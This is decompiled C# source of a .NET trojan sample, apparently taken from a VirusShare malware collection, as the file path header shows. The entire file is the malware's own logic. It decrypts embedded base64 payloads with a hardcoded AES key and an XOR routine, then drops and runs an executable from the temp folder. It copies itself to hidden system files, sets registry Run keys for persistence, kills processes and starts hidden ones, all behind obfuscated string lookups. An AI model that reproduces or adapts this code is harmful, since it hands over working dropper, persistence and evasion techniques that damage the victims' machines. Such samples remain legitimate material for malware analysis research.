// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=0.0.0.0, Culture=neutral, PublicKeyToken=72ec7481cfa903fe
// MVID: 4DDA4058-B5E3-443F-97CC-6CDA1335CA85
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Cryptos.cxwm-3e97d8dd19bb8c2fd8eff8eec5330d73ba64cfcee0fee099447914de48f6e623.exe

using \u0002;
using \u0004;
using \u0005;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0004
  {
    [NonSerialized]
    internal static \u0002.\u0001 \u0001;

    [STAThread]
    public static void \u0003()
    {
      if (!\u0001.\u0001.\u0003())
        return;
label_2:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 1;
label_3:
        int num3 = 2;
        \u0005.\u0004.\u0017();
label_4:
        num3 = 3;
        \u0005.\u0004.\u0019();
label_5:
        num3 = 4;
        \u0005.\u0004.\u0012();
label_6:
        num3 = 5;
        \u0005.\u0004.\u000E();
label_7:
        num3 = 6;
        if (\u0005.\u0004.\u0008(\u0003.\u0003(1480)))
          goto label_17;
label_8:
        num3 = 7;
        string str1 = Environment.GetEnvironmentVariable(\u0003.\u0003(1497)) + \u0003.\u0003(1510);
label_9:
        num3 = 8;
        string tempPath = Path.GetTempPath();
label_10:
        num3 = 9;
        if (File.Exists(tempPath + \u0003.\u0003(1515)))
          goto label_15;
label_11:
        num3 = 10;
        \u0005.\u0004.\u0006();
label_12:
        num3 = 11;
        \u0005.\u0004.\u0016();
label_13:
        num3 = 12;
        \u0005.\u0004.\u0013();
label_14:
        num3 = 13;
        \u0005.\u0004.\u001A();
        goto label_17;
label_15:
        num3 = 15;
label_16:
        num3 = 16;
        \u0005.\u0004.\u001B();
label_17:
        num3 = 19;
label_18:
        num3 = 20;
label_19:
        num3 = 21;
label_20:
        num3 = 22;
        string s1 = \u0003.\u0003(1536);
label_21:
        num3 = 23;
        byte[] numArray1 = \u0005.\u0004.\u0003(Convert.FromBase64String(s1));
label_22:
        num3 = 24;
        \u0003.\u0003(541332);
label_23:
        num3 = 25;
        \u0003.\u0003(541349);
label_24:
        num3 = 26;
label_25:
        num3 = 27;
label_26:
        num3 = 28;
label_27:
        num3 = 29;
        string str2;
        string s2 = str2;
label_28:
        num3 = 30;
        byte[] numArray2 = \u0005.\u0004.\u0003(Convert.FromBase64String(s2), \u0003.\u0003(541366));
label_29:
        num3 = 31;
        \u0003.\u0003(541443);
label_30:
        num3 = 32;
        \u0003.\u0003(541460);
label_31:
        num3 = 33;
        string str3;
        string s3 = str3;
label_32:
        num3 = 34;
        \u0005.\u0004.\u0003(Convert.FromBase64String(s3));
label_33:
        num3 = 35;
        \u0003.\u0003(541477);
label_34:
        num3 = 36;
        \u0003.\u0003(541494);
label_35:
        num3 = 37;
        \u0003.\u0003(541511);
label_36:
        num3 = 38;
        string s4 = \u0003.\u0003(541528);
label_37:
        num3 = 39;
        \u0005.\u0004.\u0003(Convert.FromBase64String(s4), \u0003.\u0003(885604));
label_38:
        num3 = 40;
        \u0003.\u0003(885613);
label_39:
        num3 = 41;
        \u0003.\u0003(885630);
label_40:
        num3 = 42;
        \u0003.\u0003(885647);
label_41:
        num3 = 43;
        \u0005.\u0004.\u0004();
label_42:
        num3 = 44;
label_43:
        num3 = 45;
label_44:
        num3 = 46;
label_45:
        num3 = 47;
        \u0003.\u0003(numArray1, \u0003.\u0003(885664));
label_46:
        num3 = 48;
        \u0003.\u0003(numArray2, \u0003.\u0003(885664));
label_47:
        num3 = 49;
        if (\u0005.\u0004.\u0003(\u0003.\u0003(885697)))
          goto label_50;
label_48:
        num3 = 50;
        if (\u0005.\u0004.\u0005(\u0003.\u0003(1515)))
          goto label_50;
label_49:
        num3 = 51;
        \u0005.\u0004.\u0014();
label_50:
        num3 = 54;
        if (\u0005.\u0004.\u0004(\u0003.\u0003(885714)))
          goto label_52;
label_51:
        num3 = 55;
        \u0005.\u0004.\u0015();
label_52:
        num3 = 57;
        \u0005.\u0004.\u0005();
label_53:
        num3 = 58;
        \u0005.\u0004.\u001C();
label_54:
        num3 = 59;
        if (\u0005.\u0004.\u0008(\u0003.\u0003(1480)))
          goto label_56;
label_55:
        num3 = 60;
        \u0005.\u0004.\u0008();
label_56:
        num3 = 62;
        \u0005.\u0004.\u0007();
label_57:
        num3 = 63;
        \u0005.\u0004.\u0011();
label_58:
        num3 = 64;
        \u0005.\u0004.\u000F();
label_59:
        num3 = 65;
        \u0005.\u0004.\u0018();
label_60:
        num3 = 66;
        \u0005.\u0004.\u0010();
        ProjectData.EndApp();
        goto label_67;
label_62:
        num1 = num3;
        switch (num2)
        {
          case 1:
            int num4 = num1 + 1;
            num1 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_7;
              case 7:
                goto label_8;
              case 8:
                goto label_9;
              case 9:
                goto label_10;
              case 10:
                goto label_11;
              case 11:
                goto label_12;
              case 12:
                goto label_13;
              case 13:
                goto label_14;
              case 14:
              case 17:
              case 18:
              case 19:
                goto label_17;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 20:
                goto label_18;
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
                goto label_21;
              case 24:
                goto label_22;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                goto label_25;
              case 28:
                goto label_26;
              case 29:
                goto label_27;
              case 30:
                goto label_28;
              case 31:
                goto label_29;
              case 32:
                goto label_30;
              case 33:
                goto label_31;
              case 34:
                goto label_32;
              case 35:
                goto label_33;
              case 36:
                goto label_34;
              case 37:
                goto label_35;
              case 38:
                goto label_36;
              case 39:
                goto label_37;
              case 40:
                goto label_38;
              case 41:
                goto label_39;
              case 42:
                goto label_40;
              case 43:
                goto label_41;
              case 44:
                goto label_42;
              case 45:
                goto label_43;
              case 46:
                goto label_44;
              case 47:
                goto label_45;
              case 48:
                goto label_46;
              case 49:
                goto label_47;
              case 50:
                goto label_48;
              case 51:
                goto label_49;
              case 52:
              case 53:
              case 54:
                goto label_50;
              case 55:
                goto label_51;
              case 56:
              case 57:
                goto label_52;
              case 58:
                goto label_53;
              case 59:
                goto label_54;
              case 60:
                goto label_55;
              case 61:
              case 62:
                goto label_56;
              case 63:
                goto label_57;
              case 64:
                goto label_58;
              case 65:
                goto label_59;
              case 66:
                goto label_60;
              case 67:
                goto label_67;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_62;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_67:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \u0004()
    {
      string Source = \u0005.\u0004.\u0001(885969);
      string str1 = \u0005.\u0004.\u0001(886042);
      string str2 = \u0005.\u0004.\u0001(886059);
      string str3 = \u0005.\u0004.\u0001(886076);
      FileSystem.FileCopy(Source, \u0005.\u0004.\u0001(885906));
      FileAttributes fileAttributes = FileAttributes.Hidden | FileAttributes.System;
      File.SetAttributes(\u0005.\u0004.\u0001(885906), fileAttributes);
    }

    public static byte[] \u0003([In] byte[] obj0)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(obj0, 0, obj0.Length);
      }
    }

    public static void \u0005()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886093), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = \u0005.\u0004.\u0001(886123);
      string str2 = \u0005.\u0004.\u0001(886140);
      string str3 = \u0005.\u0004.\u0001(886157);
      string str4 = \u0005.\u0004.\u0001(886174);
      string str5 = \u0005.\u0004.\u0001(886191);
      object obj = (object) \u0005.\u0004.\u0001(886196);
      string str6 = \u0005.\u0004.\u0001(886205);
      string str7 = \u0005.\u0004.\u0001(886222);
      string str8 = \u0005.\u0004.\u0001(886239);
      string str9 = \u0005.\u0004.\u0001(886256);
      if (File.Exists(\u0005.\u0004.\u0001(886273)))
        ;
      Process.Start(Path.GetTempPath() + str5 + \u0005.\u0004.\u0001(886294));
      string str10 = \u0005.\u0004.\u0001(886303);
      string str11 = \u0005.\u0004.\u0001(886320);
      string str12 = \u0005.\u0004.\u0001(886337);
    }

    public static void \u0006()
    {
      string str = \u0005.\u0004.\u0001(886354);
      File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + str);
    }

    public static void \u0007()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886375), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = \u0005.\u0004.\u0001(886384);
      string str2 = \u0005.\u0004.\u0001(886401);
      string str3 = \u0005.\u0004.\u0001(886303);
      string str4 = \u0005.\u0004.\u0001(886320);
      string str5 = \u0005.\u0004.\u0001(886337);
      string str6 = \u0005.\u0004.\u0001(886418);
      string str7 = \u0005.\u0004.\u0001(886435);
      string str8 = \u0005.\u0004.\u0001(886444);
      string str9 = \u0005.\u0004.\u0001(886461);
      string str10 = \u0005.\u0004.\u0001(886384);
      string str11 = \u0005.\u0004.\u0001(886401);
    }

    public static void \u0008()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886478), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = \u0005.\u0004.\u0001(886303);
      string str2 = \u0005.\u0004.\u0001(886320);
      string str3 = \u0005.\u0004.\u0001(886337);
      string str4 = \u0005.\u0004.\u0001(886418);
    }

    public static void \u000E()
    {
      string str1 = \u0005.\u0004.\u0001(886487);
      string str2 = \u0005.\u0004.\u0001(886504);
      string str3 = \u0005.\u0004.\u0001(886521);
      string str4 = \u0005.\u0004.\u0001(886444);
      string str5 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538);
      string str6 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      if (File.Exists(str5 + \u0005.\u0004.\u0001(886354)))
        ;
    }

    public static void \u000F()
    {
      Thread.Sleep(20001);
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string tempPath = Path.GetTempPath();
      FileAttributes fileAttributes = FileAttributes.Hidden | FileAttributes.System;
      string path = tempPath + \u0005.\u0004.\u0001(886539);
      File.SetAttributes(tempPath + \u0005.\u0004.\u0001(886354), fileAttributes);
      File.SetAttributes(tempPath + \u0005.\u0004.\u0001(886552), fileAttributes);
      string str2 = \u0005.\u0004.\u0001(886504);
      string str3 = \u0005.\u0004.\u0001(886521);
      string str4 = \u0005.\u0004.\u0001(886444);
      string str5 = \u0005.\u0004.\u0001(886461);
      File.SetAttributes(path, fileAttributes);
      string str6 = \u0005.\u0004.\u0001(886401);
      string str7 = \u0005.\u0004.\u0001(886565);
      string str8 = \u0005.\u0004.\u0001(886582);
      string str9 = \u0005.\u0004.\u0001(886599);
      string str10 = \u0005.\u0004.\u0001(886616);
      string str11 = \u0005.\u0004.\u0001(886633);
      string str12 = \u0005.\u0004.\u0001(886650);
      string str13 = \u0005.\u0004.\u0001(886667);
    }

    public static void \u0010()
    {
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string tempPath = Path.GetTempPath();
      string str2 = \u0005.\u0004.\u0001(886684);
      string str3 = \u0005.\u0004.\u0001(886384);
      string str4 = \u0005.\u0004.\u0001(886697);
      string str5 = \u0005.\u0004.\u0001(886401);
      File.Delete(tempPath + \u0005.\u0004.\u0001(1752) + str2);
      string str6 = \u0005.\u0004.\u0001(886303);
      string str7 = \u0005.\u0004.\u0001(886320);
      string str8 = \u0005.\u0004.\u0001(886337);
      string str9 = \u0005.\u0004.\u0001(886418);
      string str10 = \u0005.\u0004.\u0001(886487);
      File.Delete(tempPath + \u0005.\u0004.\u0001(1752) + str4);
      File.Delete(tempPath + \u0005.\u0004.\u0001(886710));
      if (File.Exists(tempPath + \u0005.\u0004.\u0001(886731)))
        return;
      string str11 = \u0005.\u0004.\u0001(886748);
      File.Delete(tempPath + \u0005.\u0004.\u0001(1752) + str11);
    }

    public static byte[] \u0003([In] byte[] obj0, [In] string obj1)
    {
      byte[] bytes = Encoding.Default.GetBytes(obj1);
      int num1 = (int) obj0[checked (obj0.Length - 1)] ^ 112;
      byte[] arySrc = new byte[checked (obj0.Length + 1)];
      int num2 = checked (obj0.Length - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        int index2;
        arySrc[index1] = checked ((byte) ((int) obj0[index1] ^ num1 ^ (int) bytes[index2]));
        if (index2 == checked (obj1.Length - 1))
          index2 = 0;
        else
          checked { ++index2; }
        checked { ++index1; }
      }
      return (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (obj0.Length - 2 + 1)]);
    }

    private static bool \u0003([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886761));
      int index = 0;
      if (index < processesByName.Length)
        goto label_2;
label_1:
      bool flag;
      return flag;
label_2:
      flag = processesByName[index] != null;
      goto label_1;
    }

    private static bool \u0004([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886770));
      int index = 0;
      if (index < processesByName.Length)
        goto label_2;
label_1:
      bool flag;
      return flag;
label_2:
      flag = processesByName[index] != null;
      goto label_1;
    }

    private static bool \u0005([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886779));
      int index = 0;
      if (index < processesByName.Length)
        goto label_2;
label_1:
      bool flag;
      return flag;
label_2:
      flag = processesByName[index] != null;
      goto label_1;
    }

    private static bool \u0006([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886792));
      int index = 0;
      if (index < processesByName.Length)
        goto label_2;
label_1:
      bool flag;
      return flag;
label_2:
      flag = processesByName[index] != null;
      goto label_1;
    }

    private static bool \u0007([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886797));
      int index = 0;
      if (index < processesByName.Length)
        goto label_2;
label_1:
      bool flag;
      return flag;
label_2:
      flag = processesByName[index] != null;
      goto label_1;
    }

    private static bool \u0008([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886802));
      int index = 0;
      if (index < processesByName.Length)
        goto label_2;
label_1:
      bool flag;
      return flag;
label_2:
      flag = processesByName[index] != null;
      goto label_1;
    }

    public static void \u0011()
    {
      Process[] processesByName = Process.GetProcessesByName(\u0005.\u0004.\u0001(886815));
      if (processesByName.Length <= 0)
        return;
      int num1 = checked (processesByName.Length - 1);
      int index = 0;
      while (index <= num1)
      {
        if (!processesByName[index].HasExited)
        {
          if ((double) processesByName[index].WorkingSet64 / 1024.0 < 130.0)
          {
            try
            {
              processesByName[index].Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              int num2 = (int) MessageBox.Show(ex.Message);
              ProjectData.ClearProjectError();
            }
          }
        }
        checked { ++index; }
      }
    }

    public static void \u0012()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886824), \u0005.\u0004.\u0001(886102), false) != 0)
        ;
    }

    public static void \u0013()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886102), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538);
      string str3 = str2 + \u0005.\u0004.\u0001(886710);
      FileSystem.FileCopy(Application.ExecutablePath, str2 + \u0005.\u0004.\u0001(886710));
      StreamWriter streamWriter = new StreamWriter(str2 + \u0005.\u0004.\u0001(886833));
      streamWriter.Write(\u0005.\u0004.\u0001(886846));
      streamWriter.Dispose();
    }

    private static void \u0014()
    {
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538);
      byte[] data = \u0005.\u0004.\u0003(Convert.FromBase64String(\u0005.\u0004.\u0001(541770)), \u0005.\u0004.\u0001(885846));
      \u0003.\u0003().FileSystem.WriteAllBytes(str2 + \u0005.\u0004.\u0001(886951), data, false);
      Process.Start(new ProcessStartInfo(str2 + \u0005.\u0004.\u0001(886951)));
    }

    public static void \u0015()
    {
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538);
      string s;
      \u0005.\u0004.\u0003(Convert.FromBase64String(s));
    }

    private static void \u0016()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886102), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886968) + \u0005.\u0004.\u0001(887005);
      string str3 = \u0005.\u0004.\u0001(887066);
      string str4 = \u0005.\u0004.\u0001(886761);
      string str5 = \u0005.\u0004.\u0001(887071) + \u0005.\u0004.\u0001(887076);
      string str6 = \u0005.\u0004.\u0001(887081) + \u0005.\u0004.\u0001(887094);
      string str7 = \u0005.\u0004.\u0001(887107);
      string str8 = \u0005.\u0004.\u0001(887120);
      string str9 = \u0005.\u0004.\u0001(887141);
      StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + \u0005.\u0004.\u0001(886731));
      streamWriter.Write(str3 + \u0005.\u0004.\u0001(887146) + str6 + str5 + \u0005.\u0004.\u0001(887155) + str2 + \u0005.\u0004.\u0001(887160));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(str8 + str9 + \u0005.\u0004.\u0001(887165) + str7 + \u0005.\u0004.\u0001(887186));
      streamWriter.Dispose();
    }

    public static void \u0017()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(887207), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string tempPath = Path.GetTempPath();
      string str = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      StreamWriter streamWriter = new StreamWriter(tempPath + \u0005.\u0004.\u0001(886552));
      streamWriter.Write(\u0005.\u0004.\u0001(887228));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(\u0005.\u0004.\u0001(887241));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(\u0005.\u0004.\u0001(887278) + tempPath + \u0005.\u0004.\u0001(887186));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(\u0005.\u0004.\u0001(887299));
      streamWriter.Dispose();
    }

    public static void \u0018()
    {
      if (\u0005.\u0004.\u0007(\u0005.\u0004.\u0001(886797)))
        return;
      string tempPath = Path.GetTempPath();
      string str = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      Process.Start(new ProcessStartInfo(tempPath + \u0005.\u0004.\u0001(887316))
      {
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }

    public static void \u0019()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886102), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538);
      RegistryKey currentUser = Registry.CurrentUser;
      string str3 = \u0005.\u0004.\u0001(887329);
      currentUser.OpenSubKey(\u0005.\u0004.\u0001(887346) + str3 + \u0005.\u0004.\u0001(887379), true).SetValue(\u0005.\u0004.\u0001(887396), (object) (str2 + \u0005.\u0004.\u0001(1757)));
    }

    public static void \u001A()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(886102), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538) + \u0005.\u0004.\u0001(887409);
      StreamWriter streamWriter = new StreamWriter(str2);
      string str3 = \u0005.\u0004.\u0001(887422);
      string str4 = \u0005.\u0004.\u0001(1216);
      string str5 = \u0005.\u0004.\u0001(1233);
      string str6 = \u0005.\u0004.\u0001(1250);
      string str7 = \u0005.\u0004.\u0001(1267);
      string str8 = \u0005.\u0004.\u0001(1284);
      streamWriter.Write(\u0005.\u0004.\u0001(887439));
      streamWriter.Dispose();
      ProcessStartInfo startInfo = new ProcessStartInfo(str2);
      string str9 = \u0005.\u0004.\u0001(887422);
      string str10 = \u0005.\u0004.\u0001(1216);
      string str11 = \u0005.\u0004.\u0001(1233);
      string str12 = \u0005.\u0004.\u0001(1250);
      string str13 = \u0005.\u0004.\u0001(1267);
      string str14 = \u0005.\u0004.\u0001(1284);
      startInfo.CreateNoWindow = true;
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      Process.Start(startInfo);
      string str15 = \u0005.\u0004.\u0001(887422);
      string str16 = \u0005.\u0004.\u0001(1216);
      string str17 = \u0005.\u0004.\u0001(1233);
      string str18 = \u0005.\u0004.\u0001(1250);
      string str19 = \u0005.\u0004.\u0001(1267);
      string str20 = \u0005.\u0004.\u0001(1284);
    }

    public static void \u001B()
    {
      string str1 = Environment.GetEnvironmentVariable(\u0005.\u0004.\u0001(1739)) + \u0005.\u0004.\u0001(1752);
      string str2 = \u0005.\u0004.\u0001(886538) + Path.GetTempPath() + \u0005.\u0004.\u0001(886538);
      string str3 = \u0005.\u0004.\u0001(886123);
      string str4 = \u0005.\u0004.\u0001(886140);
      string str5 = \u0005.\u0004.\u0001(886157);
      string destFileName = str2 + \u0005.\u0004.\u0001(886354);
      string str6 = str2 + \u0005.\u0004.\u0001(1757);
      string executablePath = Application.ExecutablePath;
      string str7 = \u0005.\u0004.\u0001(886174);
      File.Copy(executablePath, destFileName);
      RegistryKey localMachine = Registry.LocalMachine;
      RegistryKey currentUser = Registry.CurrentUser;
      string str8 = \u0005.\u0004.\u0001(887329);
      currentUser.OpenSubKey(\u0005.\u0004.\u0001(887346) + str8 + \u0005.\u0004.\u0001(887379), true).SetValue(\u0005.\u0004.\u0001(887396), (object) str6);
    }

    private static void \u001C()
    {
      if (Operators.CompareString(\u0005.\u0004.\u0001(887504), \u0005.\u0004.\u0001(886102), false) != 0)
        return;
      string str1 = \u0005.\u0004.\u0001(1148);
      string str2 = \u0005.\u0004.\u0001(1165);
      string str3 = \u0005.\u0004.\u0001(1182);
      string str4 = \u0005.\u0004.\u0001(1199);
      if (\u0005.\u0004.\u0006(\u0005.\u0004.\u0001(887513) + \u0005.\u0004.\u0001(887518)))
        return;
      string str5 = \u0005.\u0004.\u0001(887422);
      string str6 = \u0005.\u0004.\u0001(1216);
      string str7 = \u0005.\u0004.\u0001(1233);
      string str8 = \u0005.\u0004.\u0001(1250);
      string str9 = \u0005.\u0004.\u0001(1267);
      string str10 = \u0005.\u0004.\u0001(1284);
    }

    static \u0004() => \u0002.\u0002.\u0003();
  }
}
